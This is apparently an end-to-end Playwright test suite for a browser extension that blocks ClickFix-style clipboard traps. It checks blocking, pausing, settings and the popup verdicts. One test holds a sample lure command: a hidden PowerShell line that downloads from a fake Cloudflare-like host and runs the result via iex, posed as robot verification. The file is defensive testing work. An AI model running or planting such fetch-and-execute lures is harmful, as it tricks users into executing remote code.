// End-to-end tests: load the real extension into Chromium and visit harmless
// fake ClickFix pages (tests/fixtures/pages). Run with: npm run test:e2e
//
// Needs the "playwright" package and a Chromium build. Set CHROMIUM_PATH to use
// a specific browser binary, and CFA_EXTENSION_DIR to test an unzipped release.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { readFile, mkdtemp, rm } from 'node:fs/promises';
import { join, dirname, extname, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const { chromium } = require('playwright');

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const PAGES = join(ROOT, 'tests/fixtures/pages');
const EXT = process.env.CFA_EXTENSION_DIR || join(ROOT, 'extension');
const SAFE = '# STOP. ClickFix First Aid blocked this.';
const HELD = '# PAUSED. ClickFix First Aid held this';
const INSTALLER = 'irm https://get.scoop.sh | iex';

let server;
let base;
let port;
let context;
let userDataDir;

const TYPES = { '.js': 'text/javascript', '.css': 'text/css', '.html': 'text/html; charset=utf-8' };

before(async () => {
  server = createServer(async (req, res) => {
    try {
      const name = decodeURIComponent(new URL(req.url, 'http://x').pathname).replace(/^\/+/, '') || 'index.html';
      if (name.includes('..') || name.includes('\\') || name.includes('\0')) throw new Error('bad path');
      // /docs/... serves the published site (for the safe demo), everything else the test pages.
      const dir = name.startsWith('docs/') ? ROOT : PAGES;
      const file = resolve(dir, name);
      if (!file.startsWith(dir + '/')) throw new Error('outside the test folders');
      let body = await readFile(file);
      if (name.startsWith('review/')) body = Buffer.from(body.toString('utf8').replaceAll('PORT', String(port)).replaceAll(`localhost:${port}/`, `localhost:${port}/review/`));
      res.writeHead(200, { 'content-type': TYPES[extname(name)] || 'text/html; charset=utf-8' });
      res.end(body);
    } catch (e) {
      res.writeHead(404);
      res.end('not found');
    }
  });
  // Loopback only. Tests use both 127.0.0.1 and localhost, which are different origins.
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  port = server.address().port;
  base = `http://127.0.0.1:${port}`;

  userDataDir = await mkdtemp(join(tmpdir(), 'cfa-e2e-'));
  context = await chromium.launchPersistentContext(userDataDir, {
    headless: false,
    executablePath: process.env.CHROMIUM_PATH || undefined,
    args: ['--headless=new', `--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`, '--no-sandbox']
  });
  for (const origin of [base, `http://localhost:${port}`]) {
    await context.grantPermissions(['clipboard-read', 'clipboard-write'], { origin });
  }
  if (!context.serviceWorkers().length) await context.waitForEvent('serviceworker', { timeout: 10000 });
});

after(async () => {
  await context?.close();
  server?.close();
  if (userDataDir) await rm(userDataDir, { recursive: true, force: true });
});

async function open(name) {
  const page = await context.newPage();
  await page.goto(`${base}/${name}`);
  await page.bringToFront();
  return page;
}

const clipboard = (page) => page.evaluate(() => navigator.clipboard.readText());
const setClipboard = (page, text) => page.evaluate((t) => navigator.clipboard.writeText(t), text);
const uiState = (page) => page.evaluate(() => {
  const el = document.querySelector('clickfix-first-aid-ui:not([data-state="lure"])') || document.querySelector('clickfix-first-aid-ui');
  return el ? el.getAttribute('data-state') : null;
});
const waitUi = (page, state, timeout = 6000) =>
  page.waitForFunction((s) => !!document.querySelector(`clickfix-first-aid-ui[data-state="${s}"]`), state, { timeout });

// ---- The classic traps: the command must never reach the clipboard. ----------
for (const name of ['writetext.html', 'execcommand.html', 'copyevent.html', 'clipboarditem.html']) {
  test(`blocks the trap on ${name}`, async () => {
    const page = await open(name);
    await setClipboard(page, 'before');
    await page.click('#robot');
    await waitUi(page, 'blocked');
    assert.ok((await clipboard(page)).startsWith(SAFE));
    await page.close();
  });
}

test('blocks a trap inside an iframe and warns in the top page', async () => {
  const page = await open('iframe-top.html');
  await setClipboard(page, 'before');
  await page.frameLocator('#captcha').locator('#robot').click();
  await waitUi(page, 'blocked');
  assert.ok((await clipboard(page)).startsWith(SAFE));
  await page.close();
});

test('a plain command from a frame on a trap page: paused, then full warning', async () => {
  const page = await open('iframe-plain-top.html');
  await page.waitForTimeout(1200); // let the page be recognized as a trap
  await setClipboard(page, 'before');
  await page.frameLocator('#captcha').locator('#robot').click();
  await waitUi(page, 'blocked');
  assert.ok((await clipboard(page)).startsWith(HELD));
  await page.close();
});

test('a command copied before the trap steps appear: paused, then full warning', async () => {
  const page = await open('copy-before-steps.html');
  await setClipboard(page, 'before');
  await page.click('#robot');
  await waitUi(page, 'blocked');
  assert.ok((await clipboard(page)).startsWith(HELD));
  await page.close();
});

test('a page swapping in a command when you copy by hand is blocked', async () => {
  const page = await open('pastejack.html');
  await setClipboard(page, 'before');
  await page.evaluate(() => {
    const r = document.createRange();
    r.selectNodeContents(document.getElementById('order'));
    getSelection().removeAllRanges();
    getSelection().addRange(r);
  });
  await page.keyboard.press('Control+C');
  await waitUi(page, 'blocked');
  assert.ok((await clipboard(page)).startsWith(SAFE));
  await page.close();
});

// ---- Developer pages: pause, then let the person decide. --------------------
test('an installer copied by a site button is paused; "Copy anyway" copies it', async () => {
  const page = await open('docs-copy.html');
  await page.click('#copy');
  await waitUi(page, 'held');
  assert.ok((await clipboard(page)).startsWith(HELD));
  await page.keyboard.press('Tab'); // focus moves from the panel to "Copy anyway"
  await page.keyboard.press('Enter');
  await page.waitForFunction((t) => navigator.clipboard.readText().then((c) => c === t), INSTALLER, { timeout: 5000 });
  await page.close();
});

test('"Always allow on this site" stops pausing that site', async () => {
  const page = await open('docs-copy.html');
  await page.click('#copy');
  await waitUi(page, 'held');
  await page.keyboard.press('Tab');
  await page.keyboard.press('Tab'); // "Always allow on this site"
  await page.keyboard.press('Enter');
  await page.waitForFunction((t) => navigator.clipboard.readText().then((c) => c === t), INSTALLER, { timeout: 5000 });
  await page.waitForTimeout(2500);
  await setClipboard(page, 'before');
  await page.click('#copy');
  await page.waitForTimeout(800);
  assert.equal(await clipboard(page), INSTALLER);
  // Undo, so other tests start clean.
  await page.evaluate(() => {});
  await page.close();
  const worker = context.serviceWorkers()[0];
  await worker.evaluate(() => chrome.storage.local.set({ settings: { holdInstallers: true, allowSites: [] } }));
});

test('copying an installer by hand (select + Ctrl+C) is not paused', async () => {
  const page = await open('docs-copy.html');
  await setClipboard(page, 'before');
  await page.evaluate(() => {
    const r = document.createRange();
    r.selectNodeContents(document.getElementById('cmd'));
    getSelection().removeAllRanges();
    getSelection().addRange(r);
  });
  await page.keyboard.press('Control+C');
  await page.waitForTimeout(800);
  assert.equal((await clipboard(page)).trim(), INSTALLER);
  assert.equal(await uiState(page), null);
  await page.close();
});

test('normal copy is untouched and silent', async () => {
  const page = await open('normal-copy.html');
  await page.click('#copy');
  await page.waitForFunction(() => document.title === 'copied', null, { timeout: 5000 });
  assert.equal(await clipboard(page), 'https://www.example.com/article?id=42');
  await page.waitForTimeout(1500);
  assert.equal(await uiState(page), null);
  await page.close();
});

// ---- Trap-page banner. -----------------------------------------------------
test('a trap page is flagged even before anything is copied', async () => {
  const page = await open('lure-only.html');
  await waitUi(page, 'lure');
  await page.close();
});

test('trap steps revealed after a click are flagged', async () => {
  const page = await open('reveal.html');
  await page.waitForTimeout(1200);
  assert.equal(await uiState(page), null, 'nothing to flag while the steps are hidden');
  await page.click('#robot');
  await waitUi(page, 'lure');
  await page.close();
});

test('a normal Win+R tutorial is not flagged', async () => {
  const page = await open('tutorial.html');
  await page.waitForTimeout(2000);
  assert.equal(await uiState(page), null);
  await page.close();
});

test('the public safe demo page triggers the block', async () => {
  const page = await open('docs/demo.html');
  await setClipboard(page, 'before');
  await page.click('#robot');
  await waitUi(page, 'blocked');
  assert.ok((await clipboard(page)).startsWith(SAFE));
  await page.close();
});

// ---- Regression tests from the independent security review. -----------------
// clip: 'safe' = blocked text, 'held' = paused text, 'protected' = either, or 'before' = untouched
// ui:   expected warning, or null for none
const REVIEW = [
  ['baseline', 'safe', 'blocked'],
  ['tostring', 'notpayload', null],
  ['itemsadd', 'safe', 'blocked'],
  ['arrayproto', 'safe', 'blocked'],
  ['regexproto', 'safe', 'blocked'],
  ['split_junk', 'safe', 'blocked'],
  ['late_instr', 'protected', 'blocked'],
  ['late_instr2', 'protected', 'blocked'],
  ['css_content', 'protected', 'blocked'],
  ['css_content2', 'protected', 'blocked'],
  ['shadow', 'protected', 'blocked'],
  ['xorigin_steps', 'protected', 'blocked'],
  ['comspec', 'safe', 'blocked'],
  ['curlstartup', 'safe', 'blocked'],
  ['stopprop', 'safe', 'blocked'],
  ['flood', 'held', 'held'],
  ['forged', 'before', null],
  ['forged_frame', 'before', null],
  ['fp_tutorial', 'held', 'held'],
  ['fp_nextdata', 'held', 'held'],
  ['iframe_realm', 'safe', 'blocked'],
  ['iframe_realm_late', 'safe', 'blocked'],
  ['iframe_setdata', 'safe', 'blocked'],
  ['shadow_ta', 'safe', 'blocked']
];

for (const [name, clip, ui] of REVIEW) {
  test(`review: ${name}`, async () => {
    const page = await open(`review/${name}.html`);
    await setClipboard(page, 'before');
    await page.waitForTimeout(300);
    await page.click('#b', { force: true, timeout: 3000 }).catch(() => {});
    if (ui) await waitUi(page, ui).catch(() => {});
    else await page.waitForTimeout(1800);
    const c = await clipboard(page);
    if (clip === 'safe') assert.ok(c.startsWith(SAFE), `clipboard: ${c}`);
    if (clip === 'held') assert.ok(c.startsWith(HELD), `clipboard: ${c}`);
    if (clip === 'protected') assert.ok(c.startsWith(SAFE) || c.startsWith(HELD), `clipboard: ${c}`);
    if (clip === 'before') assert.equal(c, 'before');
    if (clip === 'notpayload') assert.ok(!/echo test|iex/.test(c), `clipboard: ${c}`);
    const state = await uiState(page);
    if (ui === null) assert.ok(state === null || state === 'lure', `no warning expected, got ${state}`);
    else assert.equal(state, ui);
    await page.close();
  });
}

test('the hook looks native to a simple toString check', async () => {
  const page = await open('review/detect.html');
  await page.click('#b');
  await page.waitForFunction(() => document.title.startsWith('done'), null, { timeout: 5000 });
  assert.equal(await page.title(), 'done native');
  await page.close();
});

// ---- Long copies (v0.3). -----------------------------------------------------
test('"Copy anyway" copies the whole of a long held command, not a cut-off part', async () => {
  const page = await open('long-copy.html');
  const full = await page.evaluate(() => window.CFA_TEST.longInstaller);
  assert.ok(full.length > 50000);
  await page.click('#long-installer');
  await waitUi(page, 'held');
  assert.ok((await clipboard(page)).startsWith(HELD));
  await page.keyboard.press('Tab');
  await page.keyboard.press('Enter');
  await page.waitForFunction((n) => navigator.clipboard.readText().then((c) => c.length === n), full.length, { timeout: 5000 });
  assert.equal(await clipboard(page), full);
  await page.close();
});

test('text longer than the guard can check is paused, never simply allowed', async () => {
  const page = await open('long-copy.html');
  const huge = await page.evaluate(() => window.CFA_TEST.huge);
  await page.click('#huge');
  await waitUi(page, 'held');
  assert.ok((await clipboard(page)).startsWith(HELD));
  await page.keyboard.press('Tab');
  await page.keyboard.press('Enter');
  await page.waitForFunction((n) => navigator.clipboard.readText().then((c) => c.length === n), huge.length, { timeout: 5000 });
  await page.close();
});

// ---- The background worker can be stopped at any time (v0.3). ----------------
async function extensionId() {
  return new URL(context.serviceWorkers()[0].url()).host;
}

async function stopWorker() {
  const page = await context.newPage();
  const cdp = await context.newCDPSession(page);
  await cdp.send('ServiceWorker.enable');
  await cdp.send('ServiceWorker.stopAllWorkers');
  await cdp.detach();
  await page.close();
}

test('connecting the dots survives the background worker being stopped', async () => {
  const page = await open('iframe-plain-top.html');
  await page.waitForTimeout(1200); // the trap steps are seen and remembered
  await stopWorker(); // Chrome does this by itself after about 30 idle seconds
  await page.waitForTimeout(300);
  await setClipboard(page, 'before');
  await page.frameLocator('#captcha').locator('#robot').click();
  await waitUi(page, 'blocked');
  assert.ok((await clipboard(page)).startsWith(HELD));
  await page.close();
});

// ---- The extension's own pages. ----------------------------------------------
test('the popup checks a pasted command locally', async () => {
  const id = await extensionId();
  const page = await context.newPage();
  await page.goto(`chrome-extension://${id}/popup/popup.html`);
  const verdictFor = async (text) => {
    await page.fill('#command', text);
    await page.click('#check');
    return page.getAttribute('#result', 'data-verdict');
  };
  assert.equal(await verdictFor('powershell -w h -nop -c "iwr https://cloubflare.example.top/5 | iex" # I am not a robot - Verification ID: 4821'), 'block');
  assert.equal(await verdictFor(INSTALLER), 'hold');
  assert.equal(await verdictFor('npm install react'), 'allow');
  assert.match(await page.textContent('#result'), /does not prove it is safe/);
  await page.close();
});

test('popup settings changes made at the same moment are all kept', async () => {
  const id = await extensionId();
  const page = await context.newPage();
  await page.goto(`chrome-extension://${id}/popup/popup.html`);
  await page.evaluate(() => chrome.storage.local.set({ settings: { holdInstallers: true, allowSites: ['a.example', 'b.example'] } }));
  const results = await page.evaluate(() => Promise.all([
    chrome.runtime.sendMessage({ type: 'cfa-popup', action: 'remove-site', host: 'a.example' }),
    chrome.runtime.sendMessage({ type: 'cfa-popup', action: 'set-hold', value: false }),
    chrome.runtime.sendMessage({ type: 'cfa-popup', action: 'remove-site', host: 'b.example' })
  ]));
  assert.deepEqual(results.map((r) => r.ok), [true, true, true]);
  const s = await page.evaluate(() => chrome.storage.local.get('settings').then((r) => r.settings));
  assert.deepEqual(s, { holdInstallers: false, allowSites: [] });
  await page.evaluate(() => chrome.storage.local.set({ settings: { holdInstallers: true, allowSites: [] } }));
  await page.close();
});

test("the extension's own pages cannot make network requests", async () => {
  const id = await extensionId();
  const page = await context.newPage();
  await page.goto(`chrome-extension://${id}/popup/popup.html`);
  const outcome = await page.evaluate((url) => fetch(url, { mode: 'no-cors' }).then(() => 'connected', (e) => 'refused: ' + e.name), `${base}/normal-copy.html`);
  assert.match(outcome, /^refused/);
  await page.close();
});

test('only the popup may change settings', async () => {
  const id = await extensionId();
  const page = await context.newPage();
  await page.goto(`chrome-extension://${id}/pages/recovery.html`);
  const r = await page.evaluate(() => chrome.runtime.sendMessage({ type: 'cfa-popup', action: 'set-hold', value: false }));
  assert.equal(r.ok, false);
  const s = await page.evaluate(() => chrome.storage.local.get('settings').then((x) => x.settings));
  assert.notEqual(s && s.holdInstallers, false);
  await page.close();
});

test('the popup counts what was blocked and paused', async () => {
  const worker = context.serviceWorkers()[0];
  const extId = new URL(worker.url()).host;
  const page = await context.newPage();
  await page.goto(`chrome-extension://${extId}/popup/popup.html`);
  await page.waitForFunction(() => Number(document.getElementById('blocked').textContent) >= 10, null, { timeout: 5000 });
  assert.ok(Number(await page.textContent('#held')) >= 3);
  assert.ok(Number(await page.textContent('#lures')) >= 1);
  await page.close();
});

test('the recovery guide is bundled and opens offline', async () => {
  const worker = context.serviceWorkers()[0];
  const extId = new URL(worker.url()).host;
  const page = await context.newPage();
  await page.goto(`chrome-extension://${extId}/pages/recovery.html`);
  assert.match(await page.textContent('h1'), /What now\?/);
  await page.close();
});
